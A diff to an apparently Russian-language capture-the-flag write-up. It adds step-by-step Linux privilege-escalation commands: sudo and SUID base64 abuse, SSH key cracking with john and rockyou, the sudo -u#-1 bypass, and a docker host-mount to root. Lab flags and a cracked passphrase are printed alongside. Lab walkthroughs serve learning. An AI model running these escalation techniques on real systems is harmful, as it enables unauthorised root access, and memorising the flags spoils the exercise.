@@ -412,28 +412,71 @@ ken{4115bf456d1aaf012ed4550c418ba99f}
 ```commandline
 sudo -l
 sudo -u sean vim
-
+grep -r 'sean{' /var/log 2>/dev/null
 ```
 ```commandline
 sean{4c5685f4db7966a43cf8e95859801281}
 ```
 Какой флаг у Пенелопы?
 ```commandline
+printf %s 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
+# p3nelope
+su penelope
+cd /home/sean
+id
+cat flag.txt
+```
+```commandline
 penelope{2da1c2e9d2bd0004556ae9e107c1d222}
 ```
 Какой флаг у майи?
+```commandline
+ls -lhA
+gtfoblookup linux suid base64
+LFILE=/home/maya/flag.txt
+./base64 "$LFILE" | base64 -d
+```
 ```commandline
 maya{a66e159374b98f64f89f7c8d458ebb2b}
 ```
 Какова парольная фраза Роберта?
 ```commandline
+su maya
+cd /home/penelope
+ls -lhA
+ls -lhA old_robert_ssh
+cat old_robert_ssh/id_rsa
+sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python3.9 - id_rsa_robert
+ssh2john id_rsa_robert
+john robert_ssh.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=ssh
+su robert
+ss -nlpt | grep 22
+ssh robert@<IP> -p 2222 -i olold_robert_ssh/id_rsa
+id
+cat robert.txt
+```
+```commandline
 industryweapon
 ```
 Что такое user.txt?
 ```commandline
+sudo --version
+sudo -u#-l /bin/bash
+whoami
+cd /root
+cat user.tx
+```
+```commandline
 user{620fb94d32470e1e9dcf8926481efc96}
 ```
 Что такое root.txt?
+```commandline
+./docker ps -a
+./docker image ls
+./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+id
+cat /root/root.txt
+```
 ```commandline
 root{62ca2110ce7df377872dd9f0797f8476}
 ```
